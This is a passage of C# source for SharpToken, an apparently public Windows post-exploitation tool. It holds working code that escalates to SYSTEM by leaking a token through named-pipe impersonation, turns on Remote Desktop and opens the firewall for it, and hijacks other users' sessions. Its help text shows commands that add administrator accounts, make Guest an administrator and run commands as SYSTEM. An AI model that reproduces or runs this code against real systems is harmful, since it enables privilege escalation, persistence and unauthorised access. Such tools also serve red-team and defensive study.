                        string root = "root\\cimv2\\terminalservices";
                        if (Environment.OSVersion.Version.Major < 6)
                        {
                            root = "root\\cimv2";
                        }
                        ManagementClass mc = new ManagementClass(root, "Win32_TerminalServiceSetting", null);
                        mc.Scope.Options.EnablePrivileges = true;
                        ManagementObjectEnumerator managementObjectEnumerator = mc.GetInstances().GetEnumerator();
                        managementObjectEnumerator.MoveNext();
                        win32TerminalServiceSetting = (ManagementObject)managementObjectEnumerator.Current;

                        System.Management.ManagementBaseObject inParams = null;
                        inParams = win32TerminalServiceSetting.GetMethodParameters("SetAllowTSConnections");
                        inParams["AllowTSConnections"] = ((System.UInt32)(1));
                        inParams["ModifyFirewallException"] = ((System.UInt32)(1));
                        System.Management.ManagementBaseObject outParams = win32TerminalServiceSetting.InvokeMethod("SetAllowTSConnections", inParams, null);
                        uint returnValue = System.Convert.ToUInt32(outParams.Properties["ReturnValue"].Value);
                        if (returnValue == 0)
                        {
                            try
                            {
                                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", false))
                                {
                                    if (key != null)
                                    {
                                        rdpPort = (int)key.GetValue("PortNumber", 3389);
                                    }
                                }
                            }
                            catch (Exception e)
                            {
                                consoleWriter.WriteLine(e.ToString());
                            }
                        }
                        else
                        {
                            throw new Exception("enableRDP return: " + returnValue);
                        }
                    }
                    catch (Exception e)
                    {
                        NativeMethod.RevertToSelf();
                        processToken.Close();
                        return true;
                    }
                }
                else
                {
                    processToken.Close();
                    return true;
                }
                isOK = true;
                NativeMethod.RevertToSelf();
                processToken.Close();
                return false;
            });

            if (isOK)
            {
                consoleWriter.WriteLine($"[*] enableRDP Successful RDPPort:{rdpPort}!");
            }
            else
            {
                consoleWriter.WriteLine("[-] enableRDP Fail!");
            }
        }
        public static void tscon(TextWriter consoleWriter, int targetSessionId, int sourceSessionId) {
            if (sourceSessionId == -1)
            {
                sourceSessionId = NativeMethod.WTSGetActiveConsoleSessionId();
            }
            if (sourceSessionId < 0)
            {
                consoleWriter.WriteLine("[*] Please enter sourceSessionId\nSharpToken tscon 2 1");
            }
            else
            {
                bool isOK = false;
                TokenuUils.ListProcessTokens(0, processToken =>
                {
                    if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                    {
                        try
                        {
                            if (NativeMethod.WTSConnectSession(targetSessionId, sourceSessionId, "", true) == 0)
                            {
                                throw new Exception("" + Marshal.GetLastWin32Error());
                            }
                        }
                        catch (Exception e)
                        {
                            NativeMethod.RevertToSelf();
                            processToken.Close();
                            return true;
                        }
                    }
                    else
                    {
                        processToken.Close();
                        return true;
                    }
                    isOK = true;
                    NativeMethod.RevertToSelf();
                    processToken.Close();
                    return false;
                });

                if (isOK)
                {
                    consoleWriter.WriteLine("[*] Success!");
                }
                else
                {
                    consoleWriter.WriteLine($"[!] Failed to connect to session: {targetSessionId} error: {Marshal.GetLastWin32Error()}");
                }
            }



        }


        public static IntPtr GiveMeFullPrivToken(TextWriter consoleWriter) {
            IntPtr token = IntPtr.Zero;
            IntPtr pipeServerHandle = NativeMethod.BAD_HANLE;
            IntPtr pipeClientHandle = NativeMethod.BAD_HANLE;
            Thread clientThread = null;
            Thread serverThread = null;
           
            try
            {
                string uncPath = Guid.NewGuid().ToString();
                string serverPipe = $"\\\\.\\pipe\\{uncPath}";
                string clientPipe = $"\\\\127.0.0.1\\pipe\\{uncPath}";
                SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
                pipeServerHandle = NativeMethod.CreateNamedPipe(serverPipe, NativeMethod.PIPE_ACCESS_DUPLEX, NativeMethod.PIPE_TYPE_BYTE | NativeMethod.PIPE_READMODE_BYTE | NativeMethod.PIPE_WAIT, NativeMethod.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);
                if (pipeServerHandle != NativeMethod.BAD_HANLE)
                {
                    clientThread = new Thread(() =>
                    {
                        pipeClientHandle = NativeMethod.CreateFileW(clientPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);
                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
                        stream.WriteByte(0xaa);
                        stream.Flush();
                    });
                    serverThread = new Thread(() =>
                    {
                        NativeMethod.ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);
                        FileStream stream = new FileStream(pipeServerHandle,FileAccess.ReadWrite);
                        stream.ReadByte();
                    });

                    clientThread.Start();
                    Thread.Sleep(30);
                    serverThread.Start();

                    if (serverThread.Join(3000))
                    {
                        if (NativeMethod.ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();

                            token = windowsIdentity.Token;

                            NativeMethod.RevertToSelf();
                        }
                        else
                        {
                            consoleWriter.WriteLine($"[!] ImpersonateNamedPipeClient fail error:{Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        consoleWriter.WriteLine("[!] ConnectNamedPipe timeout");
                    }

                }
                else
                {
                    consoleWriter.WriteLine($"[!] CreateNamedPipe fail error:{Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                consoleWriter.WriteLine(e);
            }
            finally {
                if (pipeClientHandle != NativeMethod.BAD_HANLE)
                {
                    NativeMethod.CloseHandle(pipeClientHandle);
                }
                if (pipeServerHandle != NativeMethod.BAD_HANLE)
                {
                    NativeMethod.CloseHandle(pipeServerHandle);
                }
                if (clientThread != null && clientThread.IsAlive)
                {
                    clientThread.Abort();
                }
                if (serverThread != null && serverThread.IsAlive)
                {
                    serverThread.Abort();
                }

            }
            return token;
        }

        public static void help(TextWriter consoleWriter)
        {
            consoleWriter.WriteLine(@"

SharpToken By BeichenDream
=========================================================

Github : https://github.com/BeichenDream/SharpToken

If you are an NT AUTHORITY\NETWORK SERVICE user then you just need to add the bypass parameter to become an NT AUTHORIT\YSYSTEM
e.g. 
SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami"" bypass


Usage:

SharpToken COMMAND arguments



COMMANDS:

	list_token [process pid]	[bypass]

	list_all_token [process pid] [bypass]

	add_user    <username> <password> [group] [domain] [bypass]

	enableUser <username> <NewPassword> [NewGroup] [bypass]

	delete_user <username> [domain] [bypass]
    
	execute <tokenUser> <commandLine> [Interactive] [bypass]

	enableRDP [bypass]

	tscon <targetSessionId> [sourceSessionId] [bypass]


example:
    SharpToken list_token
    SharpToken list_token bypass
    SharpToken list_token 6543
    SharpToken add_user admin Abcd1234! Administrators
    SharpToken enableUser Guest Abcd1234! Administrators
    SharpToken delete_user admin
    SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami""
    SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami"" bypass
    SharpToken execute ""NT AUTHORITY\SYSTEM"" cmd true
    SharpToken execute ""NT AUTHORITY\SYSTEM"" cmd true bypass
    SharpToken tscon 1
");
        }


        static void Main(string[] args)
        {

            TextWriter consoleWriter = Console.Out;
            TextReader consoleReader = Console.In;


            IntPtr currentProcessHandle = NativeMethod.GetCurrentProcess();
            bool hasSeAssignPrimaryTokenPrivilege = false;
            IntPtr currentProcessToken = IntPtr.Zero;
            if (NativeMethod.OpenProcessToken(currentProcessHandle, NativeMethod.TOKEN_ALL_ACCESS_P, out currentProcessToken))
            {
                TokenuUils.tryAddTokenPriv(currentProcessToken, "SeIncreaseQuotaPrivilege");
                TokenuUils.tryAddTokenPriv(currentProcessToken, "SeDebugPrivilege");
                
                TokenuUils.tryAddTokenPriv(currentProcessToken, "SeImpersonatePrivilege");
                NativeMethod.CloseHandle(currentProcessToken);
            }
            NativeMethod.CloseHandle(currentProcessHandle);
            NativeMethod.CloseHandle(currentProcessToken);

            string domain = "WinNT://" + Environment.MachineName + ",computer";
            int processPid = 0;
            string group = "Administrators";
            bool bypassToken = false;

            if (args.Length > 0)
            {
                if (args[args.Length - 1].ToLower() == "bypass")
                {
                    
                    string[] newArgs = new string[args.Length - 1];
                    Array.Copy(args, newArgs, newArgs.Length);
                    args = newArgs;
                    NativeMethod.ContextToken = GiveMeFullPrivToken(consoleWriter);
                    if (NativeMethod.ContextToken != IntPtr.Zero)
                    {
                        bypassToken = true;
                        NativeMethod.ImpersonateLoggedOnUser(NativeMethod.ContextToken);
                        consoleWriter.WriteLine("[*] Leak of complete Priv token successful!");
                    }
                    else
                    {
                        consoleWriter.WriteLine("[!] Leak token fail!");
                    }

                }
            }
            

            if (args.Length > 0)
            {
                string method = args[0];
                switch (method)
                {
                    case "list_token":
                        if (args.Length > 1)
                        {
                            processPid = int.Parse(args[1]);
                        }
                        listToken(consoleWriter, processPid);
                        break;
                    case "list_all_token":
                        if (args.Length > 1)
                        {
                            processPid = int.Parse(args[1]);
                        }
                        listAllToken(consoleWriter, processPid);
                        break;
                    case "add_user":
                        if (args.Length < 3)
                        {
                            goto help;
                        }
                        else
                        {
                            string userName = args[1];
                            string password = args[2];
                            if (args.Length > 3)
                            {
                                group = args[3];
                                if (args.Length > 4)
                                {
                                    domain = args[4];
                                }
                            }
                            addUser(consoleWriter, domain,userName,password,group);
                            break;
                        }
                    case "enableUser":
                        if (args.Length < 3)
                        {
                            goto help;
                        }
                        else
                        {
                            string userName = args[1];
                            string password = args[2];
                            if (args.Length > 3)
                            {
                                group = args[3];
                                if (args.Length > 4)
                                {
                                    domain = args[4];
                                }
                            }
                            enableUser(consoleWriter, domain, userName, password, group);
                            break;
                        }
                    case "enableRDP":
                        enableRDP(consoleWriter);
                        break;
                    case "tscon":
                        if (args.Length > 1)
                        {
                            int targetSessionId = int.Parse(args[1]); int sourceSessionId = int.Parse(args.Length > 2 ? args[2] :"-1");
                            tscon(consoleWriter, targetSessionId,sourceSessionId);
                        }
                        else
                        {
                            goto help;
                        }
                        break;
                    case "delete_user":
                        if (args.Length < 2)
                        {
                            goto help;
                        }
                        else
                        {
                            string userName = args[1];
                            if (args.Length > 2)
                            {
                                domain = args[2];
                            }
                            deleteUser(consoleWriter, domain,userName);
                            break;
                        }
                    case "execute":
                        if (args.Length < 3)
                        {
                            goto help;
                        }
                        else
                        {
                            string tokenUser = args[1];
                            string commandLine = args[2];
                            bool isInteractive = false;
                            if (args.Length > 3)
                            {
                                isInteractive = bool.Parse(args[3]);
                            }

                            if (isInteractive)
                            {
                                createProcessInteractive(consoleWriter, consoleReader, tokenUser,commandLine);
                            }
                            else
                            {
                                createProcessReadOut(consoleWriter, tokenUser,commandLine);
                            }
                            break;
                        }
                    default:
                        goto help;
                }
                
            }
            else
            {
                goto help;
            }


            return;
            help:
            help(consoleWriter);

            if (bypassToken && NativeMethod.ContextToken!=IntPtr.Zero)
            {
                NativeMethod.RevertToSelfEx();
                NativeMethod.CloseHandle(NativeMethod.ContextToken);
                NativeMethod.ContextToken = IntPtr.Zero;
            }
        }

    }




}
